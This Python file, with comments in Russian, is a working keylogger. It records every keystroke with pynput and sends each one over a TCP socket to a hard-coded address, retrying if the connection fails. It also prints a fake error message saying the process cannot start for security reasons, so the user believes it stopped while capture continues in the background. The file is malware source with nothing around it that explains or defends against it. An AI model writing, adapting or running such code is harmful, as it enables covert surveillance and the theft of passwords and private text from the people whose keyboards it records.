import socket
import threading
import time
from pynput import keyboard 

result_string = ''
lock = threading.Lock()

def send_string(string):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect(('192.168.84.235', 1289))
            s.sendall(string.encode('utf-8'))
        except Exception as e:
            print(f'Ошибка при отправке данных: {e}')

def on_press(key):
    global result_string
    while True:
        try: 
            try:
                with lock: 
                    result_string += str(key.char)
                    send_string(result_string)
                    result_string = ''
                    break
            except AttributeError:
                with lock:
                    result_string += str(key)
                    send_string(result_string)
                    result_string = ''
                    break
        except (ConnectionAbortedError, socket.error) as e:
            time.sleep(5) # ждем и пытаемся начать снова

def start_keyboard_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def main():
    keyboard_thread = threading.Thread(target=start_keyboard_listener)
    keyboard_thread.daemon = True
    keyboard_thread.start()
    print('The process cannot start due to security reasons')

    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()